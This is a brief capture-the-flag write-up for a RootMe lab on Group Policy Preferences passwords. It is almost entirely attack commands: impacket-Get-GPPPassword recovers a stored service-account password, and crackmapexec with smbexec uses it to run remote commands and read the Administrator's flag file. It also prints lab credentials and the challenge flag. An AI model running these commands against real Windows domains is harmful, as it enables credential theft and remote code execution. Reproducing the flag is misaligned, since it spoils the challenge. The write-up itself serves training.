---
title: RootMe - Windows - Group Policy Preferences Passwords
date: 2023-10-25
categories: [RootMe, Realistic]
tags: [RootMe, RootMe - Realistic, WriteUp, Active Directory, AD]
author: barabulkit
---

# Windows - Group Policy Preferences Passwords

```shell
impacket-Get-GPPPassword 'ROOTME.local/pentest:Pent3st123!@ctf08.root-me.org'
```

![getpasswords](/assets/img/rootme/realistic/gppp/getpasswords.png)

```shell
crackmapexec smb ctf08.root-me.org -u svc_dbbackup -p 'aOwbn9laiMxFz0iYxLoMhuluNWY1GppL' -x 'dir C:\Users\Administrator\Desktop' --exec-method smbexec
crackmapexec smb ctf08.root-me.org -u svc_dbbackup -p 'aOwbn9laiMxFz0iYxLoMhuluNWY1GppL' -x 'type C:\Users\Administrator\Desktop\flag.txt' --exec-method smbexec
```

![getflag](/assets/img/rootme/realistic/gppp/getflag.png)

there is a flag `Gr0up_P0l1cy_Pr3fer3nce5_P4ssw0rds_c4n_b3_d3crypt3d!!!`